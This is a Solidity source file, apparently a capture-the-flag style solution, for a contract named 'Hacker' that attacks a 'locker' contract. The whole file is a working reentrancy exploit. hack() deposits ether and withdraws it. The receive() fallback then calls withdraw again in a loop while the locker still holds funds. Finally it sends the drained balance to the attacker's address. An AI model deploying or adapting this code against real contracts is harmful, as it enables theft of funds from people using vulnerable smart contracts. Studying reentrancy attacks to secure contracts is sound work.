pragma solidity >=0.8.0;

interface ILocker {
    function deposit() external payable returns (uint256 );
    function withdraw(uint256 amount) external;
}

contract Hacker {
    ILocker public locker;
    address payable public owner;
    uint256 private id;
    
    constructor(address _locker) {
        locker = ILocker(_locker);
        owner = payable(msg.sender);
    }

    modifier onlyOwner{
        require(msg.sender == owner, "!Owner Olny");
        _;
    }

    receive() external payable{
        if (msg.sender != address(locker)) {
            return;
        }
        while (address(locker).balance > msg.value) {
            locker.withdraw(id);
        }
        uint256 balance = address(this).balance;
        (bool success,) = owner.call{ value: balance } ("");
        require(success, "!success");
    }

    function hack() external payable onlyOwner {
        uint256 amount = msg.value;
        id = locker.deposit{ value: amount } ();
        locker.withdraw(id);
    }
}